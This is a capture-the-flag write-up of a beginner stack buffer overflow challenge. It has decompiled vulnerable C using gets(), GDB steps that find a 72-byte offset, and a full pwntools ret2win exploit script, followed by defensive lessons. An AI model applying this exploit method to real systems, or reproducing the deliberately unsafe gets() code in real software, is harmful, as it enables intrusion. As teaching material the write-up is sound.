Pwn Buffer Overflow Easy

Buffer Overflow 101

📅 December 2024 | 🏆 Example CTF 2024 | 💯 150 points

Challenge Description

"Can you overflow the buffer and call the secret function?"

We're given a binary file and access to a remote server. The goal is to exploit a buffer overflow vulnerability to call a hidden function that prints the flag.

Binary Analysis

File Information

$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

Key observations:

  • 64-bit executable
  • No stack canary - we can overwrite the return address
  • No PIE - addresses are static
  • NX enabled - we can't execute shellcode on the stack

Reverse Engineering with Ghidra

Looking at the decompiled main function:

void main(void) {
    char buffer[64];

    puts("Enter your name:");
    gets(buffer);  // Vulnerable!
    printf("Hello, %s!\n", buffer);
    return;
}

void win(void) {
    system("cat flag.txt");
}

The vulnerability is clear: gets() doesn't check buffer boundaries, allowing us to overflow and overwrite the return address. There's also a win() function that prints the flag!

Finding the Offset

We need to find exactly how many bytes to write before we overwrite the return address:

$ gdb ./vuln
(gdb) pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

(gdb) run
Enter your name:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV
(gdb) pattern offset $rsp
[+] Found at offset 72

The return address is at offset 72 from the start of our buffer.

Finding the Win Function Address

$ objdump -d vuln | grep win
0000000000401196 <win>:

The win function is at 0x401196.

Building the Exploit

from pwn import *

# Set up pwntools
context.binary = './vuln'
context.log_level = 'info'

# Win function address
win_addr = 0x401196

# Build payload
offset = 72
payload = b'A' * offset          # Fill buffer + saved RBP
payload += p64(win_addr)         # Overwrite return address

# Connect to remote server (or local for testing)
# p = process('./vuln')  # Local
p = remote('challenge.ctf.com', 1337)  # Remote

# Send payload
p.recvuntil(b'Enter your name:')
p.sendline(payload)

# Get the flag
p.interactive()

Lessons Learned

  • Never use gets() - it's inherently unsafe
  • Stack canaries would have prevented this attack
  • PIE would have made the win function address unpredictable
  • Understanding memory layout is crucial for exploitation

Tools Used

  • pwntools - CTF framework for exploit development
  • Ghidra - Reverse engineering tool
  • GDB with GEF/PEDA
